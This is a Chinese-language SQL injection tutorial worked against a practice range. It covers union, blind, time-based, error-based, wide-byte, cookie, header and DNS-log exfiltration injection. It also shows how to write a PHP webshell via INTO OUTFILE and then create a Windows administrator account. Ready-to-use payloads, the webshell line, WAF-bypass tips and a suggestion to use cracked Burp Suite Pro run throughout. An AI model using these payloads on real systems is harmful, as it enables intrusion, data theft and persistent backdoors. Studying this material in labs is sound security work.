## SQL注入

注入攻击的本质，是把用户输入的数据当作代码执行。

这里有两个关键条件

* 用户能够控制输入
* 原本程序要执行的代码，拼接了**用户输入的数据然后执行**。

sql注入就是针对sql语句的注入，也可以理解为用户输入的数据当作sql语句的代码执行了

sql注入是1998年一名叫rfp的黑客发表的一篇文章所进入大众视线的

## 试探网页是否存在sql注入

这里以掌控者的靶场[猫舍](http://pu2lh35s.ia.aqlab.cn/)为例

在网站的主页面中查看url，可以发现网址栏上有一个`/?id=1`

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304071635313.webp)


很明显这是一个get请求，并且需要传递的参数是id

那么尝试一下将id的值改变

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304071636375.webp)

可以看到页面也跟着变了，这说明该网站可能存在sql注入点，因为他在用户输入了以后会执行相应的操作

接下来还要分清楚一个概念

区分**字符串**和**代码**的区别

字符串不具有代码意义，就是纯文本而代码是会执行的命令

在该网站的url栏中id这个参数还可以以其他方法进行sql注入。

当`id=1 and 1=1`时，按照代码的逻辑，这个肯定是成立的，提交给浏览器试试看会不会有反应

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304071647175.webp)

可以看到输入以后页面回显正常，那么进一步尝试，当`id=1 and 1=2`时会怎么样，按照代码逻辑这个是一定会报错的。

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304071648756.webp)

页面的信息消失了且没有回显，现在可以确定该网站存在sql注入

在数据库中所有的id字段数据类型都是整数，但是在查询语句去查询的时候要求id等于一个`字符串`类型

这个时候它会给我们的字符串进行强制类型转换。在这个过程中，如果输入的id是字母，则全部为0处理

也就是假设`id=1dawdawdawdwafb`后面无论跟着什么，在强制转换后id都是1后面的会被忽略。这是一个规则不是漏洞。

并且数据库还十分只能，可以直接在url栏来进行加减乘除。

url的中文名是**统一资源定位符**他有着自己独特的编码，也就是url编码。而+号在这里面有着特殊的意义，也就是空格的意思

也就是说在url栏中正常输入+号会被当作空格处理，如果想要使用+号必须使用url编码后的+，`%2b`才能执行+法

还可以使用sleep函数来判断是否存在。

用法就是直接输入sleep(10)也就是叫页面休眠10秒钟再返回数据。

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304071705131.webp)

可以看到页面正在加载。证明我们输入进去的字符被当成命令执行了，这就是显错注入

## 查询数据库字段

可以使用`order by`函数

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304071715193.webp)

这里输入order by 1有回显，证明该页面最有一个字段，那么再试试3.

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304071716069.webp)

这里报错了，说明他小于3个字段，那么再试试2.

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304071716690.webp)

有正常的回显，证明这个页面一共只有2个字段。

## sql注入查询当前网页的数据库名

函数是`database()`

<span style="color: rgb(255, 76, 65);">`union`&gt;</span>要求前后两条SQL语句必须字段相同

在这例题中的用法是这样

`?id=1 and 1=2 union select 1,database()` 回车

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304071739026.webp)

可以看到回显数据库名字了

`?id=1 and 1=2 union select 1,table_name from information_schema.tables where table_schema=database() limit 0,1`查询当前数据库下的表名

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304071741136.webp)


在大部分情况下管理员账号密码都在admin表里

`?id=1 and 1=2 union select 1,column_name from information_schema.columns where table_schema=database() and table_name='admin'`

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304071942865.webp)

这样我们得到了到第一个字段

如果网页有多个字段的话可以引用limit函数。 

## sqlmap

使用sqlmap可以一把梭，十分轻松的拿到库名

不过sqlmap有分Windows平台的版本还有kali的sqlmap，个人更加建议使用kali，因为更方便使用起来也舒服

`sqlmap -u "url" --tables --purge`查看当前数据库版本以及字段

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304130056038.webp)

使用`sqlmap -u "url" --dbs`命令可以直接拿到数据名

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304130053223.webp)

这里附上一个[sqlmap使用手则](https://www.cnblogs.com/hongfei/p/3872156.html)

## 联合查询

`union select`

## Burpsuite

这是一款功能非常强大的抓包改包软件。在Windows环境下，如果要使用这个工具。建议使用Java8的Java环境。

如果是Java8以上的环境建议使用最新版的`burpsuite`。否则会出现不兼容无法使用。高版本也有很多好用的功能

比如说：

* 1、高版本中内置了一个浏览器，可以免去安装HTTPS证书
* 2、并且不再需要手动配置代理
* 3、功能更多更完善

建议是使用破解专业版，因为在实际做题的时候如果遇见需要爆破的场景，社区版是不支持开启多线程模式的，而付费版是可以开启多线程模式的。

这样一来可以大大的提升请求速度，节约时间成本，以至于在爆破一些比较大的数据时会耗时过久

这里附上一个使用多线程的方法

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304092124888.webp)


## limit的作用

limit 0,1  => 更多是用来分页但还有一种意思，就是从第一行取一条数据

limit 1,1  从第二行取一条数据

limit 1,2  从第二行取两条数据

库>表>字段

## POST注入

POST注入也有两个关键条件

* 1、用户能控制输入
* 2、原本程序要执行的代码，拼接了用户输入的数据。

POST注入的高危点：

* 登录框
* 查询框
* 等各种和数据库有交互的框

POST传参和GET类型没有什么区别。

header注入都是在登录后才会产生，因为他只会记录用户，不会记录游客。

插入的语句很可能没有回显

1、盲注(比较复杂)、
2、报错注入(让数据报错，强行看返回)

## HEAD注入

安全和用户体验是对立的，用户体验比安全高，所以，不存在没有漏洞的程序。

ip的获取是有讲究的分为

代理

* 透明代理(目标知道你是谁)
* 高匿代理(完全不知道是谁在访问)

而head注入一般是这几种方式

* ip
* UA
* refer
* cookie

## updatexml函数

updatexml()更新xml文档的函数

语法：

```
uodatexml(1,concat(0x7e,(SELECT database()),0x7e),1)
```

> 实际上这里去更新了xml文档，但是我们在xml文档路径的位置里面写入了子查询，我们输入特殊字符，然后会因为不符合输入规则然后报错

但是报错的时候他其实已经执行了那个子查询代码！

> 0x7e是16进制，MSQL支持16进制，但是开头要写0x，0x7e是一个特殊符号，然后不符合路径规则报错

用法是`select updatexml(1,'!a',1)`

这样数据库就会找不到我要的这个东西，会看不懂`!a`是什么意思就会回显报错

`concat('!',database())`这行代码的意思就是将`!`和`database`的信息连接到一起


## 盲注

<br>

盲注所对应的是显错注入，如果服务器关闭了错误回显，这样即使有报错也不会显示，你也不会知道

所谓的盲注就是在服务器没有错误回显的时候完成的注入攻击。

服务器没有错误回显，对于攻击者来说缺少了非常重要的“调试信息”。

盲注又分为`布尔盲注`和`时间盲注`

<br>

**布尔盲注**

* 布尔很明显Ture跟False，也就是说他只会根据你的注入信息返回Ture和False，也就没有了之前的报错信息。

**时间盲注**

* 界面返回值只有一种，Ture无论输入任何值返回情况都会按照正常的来处理。加入特定的时间函数，通过查看web页面返回的时间来判断注入语句是否正确。

<br>

<center>盲注需要掌握的几个函数</center>

<br>

| 函数名 | 作用 |
| :--: | :--: |
| length() | 返回字符串的长度 |
| substr() | 截取字符串(语法:SUBSTR(str,pos,len); ) |
| ascii() | 返回字符的ascii码（将字符变成数字wei） |
| sleep() | 将程序挂起一段时间n为n秒 |
| if(expr1,expr2,expr3) | 判断语句，如果第一个语句正确就执行第二个语句，如果错误就执行第三个语句 |

<br>

盲注第一个考虑的就是字符串长度

`and length(database()) >= n`通过这样的函数，不断的更改n的值，就可以判断数据库的库名长度

这里依然以猫舍作为例子

以为之前已经知道了猫舍的库名是maoshe并且长度为6所以可以更加直观的查看结果

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304120035354.webp)

<br>

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304120036934.webp)

可以看到当`length(database()) > 6`时页面就不在出现回显。于是就可以知道他的库名长度为6

知道库名的长度之后，就可以使用`and ascii(substr(database(),1,1)) > n`来判断每一个字符对应的ASCII码值，以此来得到库名

而一个一个的手动去试字符，很显然这是一个非常耗费时间的事情

所以可以使用工具burpsuite来进行跑包解放双手！

这里依然以猫舍为例

将参数改成`?id=1 and ascii(substr(database(),1,1))=1`

然后使用burpsuite进行拦截发送至`Intruder`模块中进行暴力破解

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304120049126.webp)

给我们要改变的值标记一下，设置一下从1开始跑到128(因为ASCII码最多127位)

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304120049674.webp)

跑完以后按照返回的长度来排序，不一样的肯定是有东西的。

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304120053835.webp)

这里可以看到当ASCII值=109的时候返回的长度不一样，109转换成字符串的值就是m。

因为之前已经知道了库名是maoshe了所以可以，所以按照盲注的话，后面的5个字符也可以这样跑

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304120056147.webp)

回到原来选数据的地方，将箭头所指的1改为2，即可跑第二个数据库名。

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304120057077.webp)

通过同样的方法我们又得到了第数据库名字的第二个字符串对应的ASCII码

后面的重复这些操作，直到第六个的时候就可以得到数据库的全名

如果嫌弃速度慢的话其实burpsuite还支持两个数据一起跑

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304120102341.webp)

这样的话就可以一次性最多跑20个变量了

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304120101616.webp)

唯一需要注意的就是要在这里选择每个变量以什么方式跑，跑多大范围就行了

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304120103952.webp)

在我们知道数据库名的时候就可以开始跑表名了

`select table_name from information_schema.tables where table_schema=database() limit 0,1`使用这串命令就可以跑出他的表名了

具体用法是`?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=1`

## 时间注入

使用时间注入的情况就是无论怎么输入，即使让他成功报错了也不存在报错回显的情况下

可以使用函数`sleep(10)`来测试我输入的语句是否被当成代码执行

如果有被当成代码执行则页面在刷新的时候会进入一个10秒的等待才能成功刷新

这里可以搭配上前面所说的函数`if(expr1,expr2,expr3)`

这里用一个用法来解释

| expr1 | expr2 | expr3 |
| :--: | :--: | :--: |
| 要判断的命令 | 如果判断结果为Ture则执行这个模块的代码 | 如果判断结果为False则执行这个地方的代码 |

例如：

`if(1=1,sleep(10),1)`这句话的意思就是如果1=1成立，则执行`sleep(10)`让服务器休息10秒，如果1=1不成立则输出1

这是实际用法`" and if(ascii(substr(database(),1,1))=1,sleep(100),1) --asd`

这样就可以在没有报错回显的情况下依然可以这样得到数据库名字

注意在延时注入时尽量别把延时的只设的太大，这样对服务器的伤害是很大的，如果很多人都延时个几千秒，对服务器资源会造成很大的浪费！



## 宽字节注入

在实际的sql注入的过程中，如果语句没有被执行，不一定是受到了正则表达式的过滤，还有可能是遇见了魔术引号

它可以将我输入的`'` `"` `\`等用于闭合字符串的字符给使用转义字符转义掉，使无法将语句闭合

**常见的应对方式有两种**

* 第一种是使用一些不需要出现单双引号的语句

* 第二种就是宽字节注入

* 第三种单引号用0x代替，双引号什么的也可以使用16进制字符代替

> 如果要使用宽字节注入，一定要使用非utf-8编码

宽字节SQL注入主要是源于程序员设置的数据库编码为非英文编码，那么就有可能产生宽字节注入

例如说 MySQL的编码设置为了SET NAMES 'gbk'或是SET character_set_client = gbk,这样的配置会引发编码转换从而导致的注入漏洞

> 宽字节SQL注入就是php发送请求到MySQL时使用了语句SET NAMES 'gbk'或是SET character_set_client = gbk 进行了一次编码，但是又由于一些不经意的字符集转换导致了宽字节的注入。

sql注入的方法选用是灵活的，遇见魔术引号无法闭合的时候不一定一定要使用宽字节注入，应当结合其他方法例如HEAD注入权衡之后选择一个最轻松的

在一般情况下POST传参会进行一次编码、后端会进行一次解码

%df => %25df => %df =>字符串的%df

GET传参，url看到了%xx，他不会取管

## XFF and Refer

X-Forwarded-For:简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项

HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的

并且这两个是可以伪造的

直接在请求包上添加

`X-Forwarded-For: 123.123.123.123`

`Referer: https://XXXXX`

就行了

## Access注入—— Cookie注入

Access => 数据库的一种

POST注入其实是传参的一种

Cookie注入 => 特殊的传参方式产生的注入

Access MySQL mssql(sql server) Oracle

在浏览器中Cookie类似与现实中的门禁卡的意思。

> Cookie就是代表你身份的一串字符串，网站根据Cookie来识别你是谁。如果你获取了管理员的Cookie，
> 你可以无需密码直接登录管理员账户。

* 为什么Cookie可以注入？

> 在动态脚本语言中存在超全局变量可以获取多种传参方式
> 很多时候开发在开发的时候为了考虑到多种接受参数，在接受参数的时候都是用多种解释传参的方法

例如:

php中的`$_REQUESET[]`可以获取`POST`|`GET`|`COOKIE`传参

**注：php5.4以上版本就不会接受Cookie传参了**

如果开发使用了`$_REQUESET[]`来接受参数。然后我们的`GET`和`POST`传参被Waf拦截了怎么办》
或许Waf没有对`Cookie`进行检测。使用`Cookie`进行传参就可以绕过检测机制。

**设置Cookie**

* 1、在浏览器中通过按F12来进行设置
* 2、抓包直接修改
* 3、浏览器有的插件也可以设置Cookie
* 浏览器自带的js进行设置
* document.cookie是查看当前id
* document.cookie=是赋值

### 使用Cookie传参

在浏览器中有时会将and之类的sql语句给屏蔽了

所以有拦截就得绕过

* 不让他检测到
* 规避规则

它可以接受Cookie传参并且拼接进数据库。Cookie很多时候都需要URL编码

Access是很老的数据库 => 他不是数据库只是表的集合，他不存在库，只有表和字段

select 1,2,3,4,5,6,7,8,9 => MySQL

在Access数据库中可以使用and exists(select*from 表名)来查询

什么网站存在Cookie注入

* 1、ASP的站点存在肯能性极高
* PHP版本低于5.3版本的可能性极高

不要陷入思维误区

<br />

## 偏移注入

爆破其实就是使用字典一个一个的去试，如果遇上一些很奇葩的表名基本上就是无解了

偏移注入其实叫`位移注入`

字段名.表.字段 => 选择x库中的x字段

`select *from admin` => `select id, uesername, password from admin`

`select admin.* from admin` =>

admin.* 代表了admin表里的所有字段

所以表名.* = > 表里的所有字段

`select*from news where id=1 union select admin.* from admin`

union => 要求前后两条执行的SQL语句字段数必须相同

针对不同条件是要用不同的方法
1、知道表名
2、注入点的字段数要大于你想要查询的字段数

一个网站不可能只存在一个漏洞，只要是在同一个网站就肯定会有相似的漏洞

## MySQL注入-DNS注入

大部分电脑在工作时会产生日志，而DNS注入的原理就是利用这个日志

所以我们要满足以下条件

* 我们要MySQL能访问我们指定的东西  
* 我们要看到日志

DNSLOG的使用场景也是在不知道库名的情况下，让目标机器发起一个网络请求，比如

`select database()`.baidu.com

`库名.baodu.com`

`load_file`可以读取文件，读取本地和远程的文件

用法是`select load_file('绝对路径'):`

load_file()在MySQL中是默认不开启的，通常需要通过特殊的配置

需要在MySQL的配置文件里加一句`secure_flie_priv=`

读取远程文件的方法是利用Windows上的服务(文件共享服务)，“网上邻居”、共享文件

这里要引出一个叫做UNC路径的概念

UNC路径 通用命名规则，也称为通用命名规范、通用命名约定

UNC路径就是类似于\\softer这样形式的网络路径。它符合\servername\sharename格式，其中servername是服务器名，sharename是共享资源名称。

目录或文件的UNC名称可以包括共享名称下的目标路径，格式为：

`\\servername\sharename\directory\filename`

例如softer计算机的名为it168的共享文件夹，用UNC表示就是\\softer\it168

不过UNC路径也可以这样写//servername/sharename [推荐这样写]

看到日志的方法是使用[Dnslog平台](http://dnslog.cn/)

`select load_file(concat('//', database(), '.DNSLOG上请求的域名'))`

利用这个方法去查询表名

`select load_file(concat('//', (select table_name from infromation_schema.tables where table_schema=database() limit 0, 1),'.dnslog域名'));`

在实际网站进行sql注入时，会遇见一个东西

网站防火墙 => Waf => 安全狗

在大部分情况下 Waf => 商业非定制性Waf => 通用Waf

也就是说大部分情况下网站的waf都是可以在网上直接下载到的，都有一个非常相似的模板和规则

因为业务的体验性是最重要的所以waf都是有弹性的，因为有弹性才有绕过

通用型waf中还有一个东西。

index3.php/.txt => 特殊写法 Apache有一个规则，遇见某个文件，找不到的就会执行前一个文件，从右往左

sqlmap没法跑dns

当你可以DNS注入的时候，代表着你可以写文件load_flie()

select 1 into outfile `'c:/web/1.txt'`这里必须是绝对路径

所以这个时候我们就可以借用以下PHP的一句话木马了

`<?php @eval($_REQUESET[9])?>`

eval()函数， 将获取到的内容当作代码执行@是防止报错的

## MySQL注入——反弹注入

反弹注入 => 不需要修改配置就能用(实现将我查询到的数据，插入到其他的数据库)

`select *from admin`给插入到其他数据库里

目标数据库是A，你在公网服务器上建立了一个B数据库

将A得到的数据插入到B数据库里面

条件：
* MSSQL数据库
* 有公网IP MSSQL数据库

堆叠注入：再注入的时候可以用;(;代表语句结束)`<?php $a=1;$b=2;?>`

插入东西，有标准、要求字段数类型相同

反弹注入的条件：

* 1、有堆叠注入(MSSQL)
* 2、目标有外网环境，

反弹注入的使用场景：
> 明明是sql的注入点却无法进行注入，注入工具的

## Oracle注入——报错注入

Oracle——最黑心的数据库

Oracle一般用于银行、证券部门他的能力确实比其他数据库更加强大。但现在大公司有逐渐趋于MySQL数据库的趋势。

未来有可能会以MySQL为主

Oracle里还有一个特殊的函数udal它是一个实表，但是它又像一个虚表，因为它里面只有一个x数据，更多的作用是用于满足语法需求

```
select * from all_tables 查询出所有的表
select * from user_tables 查询出当前用户的表

select * from all_tab_columns 查询出所有字段
select * from user_tab_columns 查询出所有的字段

select * from v$version 查版本
rownum<2 (限制查询返回的总行数为一条)

CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1))
去查询关于主题的对应关键词，然后因为查询失败(应该是这个用户没有创建和查询的权限，默认情况没有创建，爆出为查询到的错误从而爆出查询的内容)

and 1=ctxsys.drithsx.sn(1,(select banner from sys.v$version where rownum=1))-- 查询数据库版本
```





## 使用SQL获取Webshell

Mysql导出函数：[将数据库里的内容导出]

```sql
into outfile

into dumpfile # 可以写16进制写入
```

当知道绝对路径的时候，且可以导出权限开启的时候就可以拿到webshell

`id=7 union select 1,'<?php eval($_REQUEST[8])?>' into outfile 'c:/phpstudy/www/125.php'`

关键就在于如何获取这个绝对路径。简单的网站可以用这个方法：乱输入一些参数进去使其数据库报错，就会出现绝对路径。不过真实情况下基本不会遇见

当获取到webshell以后的第一件事情就是查看当前用户的权限

一共有两个步骤

* 先`whoami`查看当前用户
* 再`net localgroup administrators`

第二个步骤的作用是查看当前服务器内的管理员名单，如果里面没有whoami的用户。那就证明你获取的权限依旧不是最高，需要进行提权。

[提权辅助网站](https://i.hacking8.com/tiquan)

使用这个网站可以进行辅助提权，下面介绍一些Windows端的命令

```windows
netstat -ano # 查看当前开放的所有端口

tasklist	 # 查看当前所有进程

systeminfo   # 查看当前系统的所有信息

net user name p@ssw0rd /all # 创建账号

net localgroup administrators name /add # 将某个用户添加到管理员权限
```

























































